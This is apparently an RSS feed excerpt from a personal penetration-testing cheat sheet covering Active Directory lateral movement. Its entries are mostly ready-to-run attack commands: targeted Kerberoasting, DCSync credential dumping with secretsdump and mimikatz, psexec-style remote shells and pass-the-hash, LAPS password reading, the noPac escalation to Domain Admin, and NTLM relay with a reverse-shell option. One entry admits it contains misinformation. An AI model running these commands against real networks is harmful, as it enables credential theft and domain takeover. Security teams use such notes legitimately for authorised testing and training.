    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/8.-lateral-movement/dacl-abuse/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/8.-lateral-movement/dacl-abuse/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt install bloodyad&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;genericwrite&#34;&gt;GenericWrite&lt;a class=&#34;anchor&#34; href=&#34;#genericwrite&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;If ADCS is installed, try &lt;a href=&#34;https://ag2s.ca/spellbook/8.-lateral-movement/adcs-attacks/#shadow-credentials&#34;&gt;shadow credentials&lt;/a&gt; first&lt;/p&gt;&#xA;&lt;h2 id=&#34;kerberoast&#34;&gt;Kerberoast&lt;a class=&#34;anchor&#34; href=&#34;#kerberoast&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;NOTE: Use when you have &lt;code&gt;GenericWrite&lt;/code&gt; or &lt;code&gt;WriteSPN&lt;/code&gt; on a &lt;strong&gt;user&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h3 id=&#34;manual&#34;&gt;Manual&lt;a class=&#34;anchor&#34; href=&#34;#manual&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;p&gt;TODO: add this&lt;/p&gt;&#xA;&lt;h3 id=&#34;automated&#34;&gt;Automated&lt;a class=&#34;anchor&#34; href=&#34;#automated&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;p&gt;Install tool&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/ShutdownRepo/targetedKerberoast.git&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd targetedKerberoast&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python -m venv .venv&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip install -r ./requirement.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Do the thing&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 ./targetedKerberoast.py -d domain.name -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt; -request-user victim&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;change-password&#34;&gt;Change password&lt;a class=&#34;anchor&#34; href=&#34;#change-password&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;NOTE: Use when you have &lt;code&gt;GenericWrite&lt;/code&gt; or &lt;code&gt;ForceChangePassword&lt;/code&gt; on a &lt;strong&gt;user&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;p&gt;Might deny service, outage, got found out, etc. Use with caution.&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/8.-lateral-movement/dcsync/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/8.-lateral-movement/dcsync/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Post exploit on domain controller.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;net localgroup&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;net user &amp;lt;user&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;jackpot if in &lt;code&gt;Domain Admins&lt;/code&gt; group&lt;/p&gt;&#xA;&lt;h2 id=&#34;automated&#34;&gt;Automated&lt;a class=&#34;anchor&#34; href=&#34;#automated&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;h3 id=&#34;netexec&#34;&gt;&lt;code&gt;netexec&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netexec&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netexec smb $target$ -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sysadmin&amp;#39;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; -M ntdsutil&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;impacket&#34;&gt;&lt;code&gt;impacket&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#impacket&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;p&gt;&lt;code&gt;&amp;quot;$domain/$user&amp;quot;&lt;/code&gt; is the SPN (service principal name) of the &lt;code&gt;Doamin Admin&lt;/code&gt; account we pwned&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-secretsdump -outputfile dcsync -just-dc &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$target&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;mimikatz&#34;&gt;&lt;code&gt;mimikatz&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mimikatz&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.\mimikatz.exe&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mimikatz # privilege::debug&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:domain\administrator&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;manual&#34;&gt;Manual&lt;a class=&#34;anchor&#34; href=&#34;#manual&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;h3 id=&#34;creating-shadow-copy-of-c&#34;&gt;Creating shadow copy of C:&lt;a class=&#34;anchor&#34; href=&#34;#creating-shadow-copy-of-c&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;h3 id=&#34;vssadminexe&#34;&gt;&lt;code&gt;vssadmin.exe&lt;/code&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vssadminexe&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;It is very likely that NTDS will be stored on &lt;code&gt;C:&lt;/code&gt; as that is the default location selected at install, but it is possible to change the location.&#xA;We use VSS for this because it is designed to make copies of volumes that may be read &amp;amp; written to actively without needing to bring a particular application or system down&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/8.-lateral-movement/impacket-exec/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/8.-lateral-movement/impacket-exec/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Need admin privilege on local machine. Will get an &lt;code&gt;NT Authority/System&lt;/code&gt; shell if works&#xA;Use SMB to get shell. If SMB is not opened on the target machine, this is not usable.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-psexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$target&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;smbexec is useful when the target machine does NOT have a writeable share available. &lt;a href=&#34;https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access&#34;&gt;How it works&lt;/a&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-smbexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$target&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;atexec&lt;/code&gt; use &lt;code&gt;Task Scheduler&lt;/code&gt; service to execute command&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-atexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$target&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;pass-the-hash&#34;&gt;Pass the hash&lt;a class=&#34;anchor&#34; href=&#34;#pass-the-hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-psexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$target&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -hashes &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&lt;/span&gt;$hash&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Same for &lt;code&gt;impacket-atexec&lt;/code&gt; and &lt;code&gt;impacket-smbexec&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;localaccounttokenfilterpolicy&#34;&gt;LocalAccountTokenFilterPolicy&lt;a class=&#34;anchor&#34; href=&#34;#localaccounttokenfilterpolicy&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;Use this on machine that does not let you do remote control, this will allow us to get shell via &lt;code&gt;smb&lt;/code&gt; on the machine.&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/8.-lateral-movement/kerberoasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/8.-lateral-movement/kerberoasting/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;&lt;strong&gt;Attack explaination&lt;/strong&gt;:&#xA;We request Kerberos TGS ticket(s) from account(s) with SPN (Service Principal Name). SPN looks like this: &lt;code&gt;Domain.local/user&lt;/code&gt;. The ticket is encrypted using the account&amp;rsquo;s &lt;code&gt;NTLM&lt;/code&gt; hash.&lt;/p&gt;&#xA;&lt;p&gt;We cannot use this requested ticket to authenticate or run command with this user&amp;rsquo;s privilege.&lt;/p&gt;&#xA;&lt;p&gt;So, we can use the whole requested ticket and feed it to &lt;code&gt;hashcat&lt;/code&gt; to crack that account&amp;rsquo;s password. The attack won&amp;rsquo;t work when that account has a complex password and we cannot crack it.&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/8.-lateral-movement/laps/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/8.-lateral-movement/laps/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;There are definitely misinfo in here. I don&amp;rsquo;t understand this.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h2 id=&#34;check-privilege&#34;&gt;Check privilege&lt;a class=&#34;anchor&#34; href=&#34;#check-privilege&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;## should be in LAPS_Readers group&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;net user &amp;lt;user&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;laps-ps-module&#34;&gt;LAPS PS module&lt;a class=&#34;anchor&#34; href=&#34;#laps-ps-module&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;h3 id=&#34;clone-repo&#34;&gt;Clone repo&lt;a class=&#34;anchor&#34; href=&#34;#clone-repo&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/ztrhgf/LAPS.git&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;transfer&#34;&gt;Transfer&lt;a class=&#34;anchor&#34; href=&#34;#transfer&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;p&gt;Open http server&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir upload&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;zip -r ./upload/AdmPwd.PS.zip ./LAPS/AdmPwd.PS&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd upload&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Download&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.10.&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;/AdmPwd.PS.zip&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Expand-Archive -Path &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.\AdmPwd.PS.zip&amp;#34;&lt;/span&gt; -DestinationPath &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.\AdmPwd.PS&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;check&#34;&gt;Check&lt;a class=&#34;anchor&#34; href=&#34;#check&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;p&gt;See who(groups) can actually read or reset passwords&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Find-LAPSDelegatedGroups&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Find-AdmPwdExtendedRights -identity *&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;See if we can read &lt;code&gt;Domain Controller&lt;/code&gt; password. Should returns &lt;code&gt;LAPS Readers&lt;/code&gt;, which is the group that we are in&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/8.-lateral-movement/nopac/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/8.-lateral-movement/nopac/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;&lt;strong&gt;Attack explaination&lt;/strong&gt;:&#xA;The attack allows intra-domain privilege escalation from standard domain user to Domain Admin level access&lt;/p&gt;&#xA;&lt;p&gt;We change the &lt;code&gt;SamAccountName&lt;/code&gt; of a computer account to match a Domain Controller&amp;rsquo;s &lt;code&gt;SamAccountName&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Needs current pwned account to be able to add 10 computer accounts to the domain&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h2 id=&#34;install-tool&#34;&gt;Install tool&lt;a class=&#34;anchor&#34; href=&#34;#install-tool&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/Ridter/noPac.git&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd ./noPAC&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;scan&#34;&gt;Scan&lt;a class=&#34;anchor&#34; href=&#34;#scan&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python3 scanner.py &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -dc-ip $target -use-ldap&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;run&#34;&gt;Run&lt;a class=&#34;anchor&#34; href=&#34;#run&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python3 noPac.py &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -dc-ip $target  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;If we &lt;code&gt;ls&lt;/code&gt; current directory, we can also see the kerberos ticket too.&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/8.-lateral-movement/ntlm-relay/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/8.-lateral-movement/ntlm-relay/</guid>
      <description>&lt;p&gt;Used to capture a connection&amp;rsquo;s &lt;code&gt;netNTLM&lt;/code&gt; hash and then pass it to another machine.&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-ntlmrelayx --no-http-server -smb2support -t $target&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By default, it dumps SAM database, but we can execute a command with &lt;code&gt;-c&lt;/code&gt; instead&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-ntlmrelayx --no-http-server -smb2support -t $target -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;some revshells&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://ag2s.ca/spellbook/8.-lateral-movement/password-spray/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://ag2s.ca/spellbook/8.-lateral-movement/password-spray/</guid>
